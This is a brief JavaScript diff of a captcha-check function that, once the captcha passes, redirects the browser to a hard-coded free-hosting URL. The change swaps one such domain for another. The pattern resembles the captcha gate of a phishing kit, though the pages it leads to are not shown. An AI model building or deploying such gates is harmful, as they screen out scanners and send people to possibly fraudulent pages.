@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://wetrensfrtdevi.iceiy.com/";
+        targetURL="https://diosfac.hstn.me/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
@@ -38,5 +38,6 @@ window.location=targetURL;
     }
 
 }
+
 
 
